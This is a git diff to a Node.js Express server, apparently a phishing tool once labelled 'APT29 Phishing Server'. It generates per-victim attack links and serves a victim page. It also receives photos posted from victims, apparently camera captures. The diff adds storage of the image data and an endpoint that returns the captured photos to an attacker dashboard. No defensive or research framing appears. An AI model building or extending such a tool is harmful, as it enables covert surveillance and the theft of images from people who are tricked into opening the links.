@@ -1,7 +1,6 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const fs = require('fs');
 const { v4: uuidv4 } = require('uuid');
 
 const app = express();
@@ -12,14 +11,15 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// Root route - redirect to dashboard
+// Root route
 app.get('/', (req, res) => {
     res.redirect('/dashboard');
 });
-// In-memory storage (resets on restart - fine for demo)
+
+// In-memory storage
 const sessions = new Map();
 
-// Generate new attack link
+// Generate attack link
 app.post('/api/generate', (req, res) => {
     const sessionId = uuidv4();
     const session = {
@@ -32,12 +32,11 @@ app.post('/api/generate', (req, res) => {
     };
     sessions.set(sessionId, session);
     
-    // Generate the full link
     const link = `${req.protocol}://${req.get('host')}/v/${sessionId}`;
     res.json({ link, sessionId });
 });
 
-// Victim landing page
+// Victim page
 app.get('/v/:sessionId', (req, res) => {
     const sessionId = req.params.sessionId;
     if (!sessions.has(sessionId)) {
@@ -48,11 +47,10 @@ app.get('/v/:sessionId', (req, res) => {
     session.status = 'ACTIVE';
     session.clicks += 1;
     
-    // Send the HTML page (we'll create this next)
     res.sendFile(path.join(__dirname, 'public', 'victim.html'));
 });
 
-// Receive photo from victim
+// Receive photo
 app.post('/api/photo', (req, res) => {
     const { sessionId, image, metadata } = req.body;
     
@@ -63,31 +61,47 @@ app.post('/api/photo', (req, res) => {
     const session = sessions.get(sessionId);
     const photoId = uuidv4();
     
-    // Store photo metadata
+    // ✅ PHOTO STORAGE - THIS SAVES THE IMAGE
     session.photos.push({
         id: photoId,
+        image: image,
         timestamp: new Date().toISOString(),
         metadata: metadata || {}
     });
     
-    // Save image to Cloudinary or local (we'll handle this later)
-    // For now, just acknowledge
     res.json({ success: true, photoId });
 });
 
-// Dashboard - attacker view
-// Dashboard - attacker view (HTML page)
+// ✅ API ENDPOINT - GET PHOTOS FOR A SESSION
+app.get('/api/photos/:sessionId', (req, res) => {
+    const sessionId = req.params.sessionId;
+    
+    let foundSession = null;
+    let fullId = null;
+    for (const [id, data] of sessions.entries()) {
+        if (id.startsWith(sessionId.replace('...', ''))) {
+            foundSession = data;
+            fullId = id;
+            break;
+        }
+    }
+    
+    if (!foundSession) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    res.json({ 
+        sessionId: fullId,
+        photos: foundSession.photos || []
+    });
+});
+
+// Dashboard HTML
 app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
-// API endpoint for dashboard data (used by the HTML page)
-// Dashboard - serve HTML page
-app.get('/dashboard', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
-});
-
-// API endpoint for dashboard data
+// Dashboard API data
 app.get('/api/dashboard', (req, res) => {
     const sessionData = Array.from(sessions.entries()).map(([id, data]) => ({
         id: id.substring(0, 8) + '...',
@@ -98,10 +112,10 @@ app.get('/api/dashboard', (req, res) => {
     }));
     
     res.json({ sessions: sessionData });
-});    
+});
 
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 APT29 Phishing Server running on port ${PORT}`);
+    console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
 });
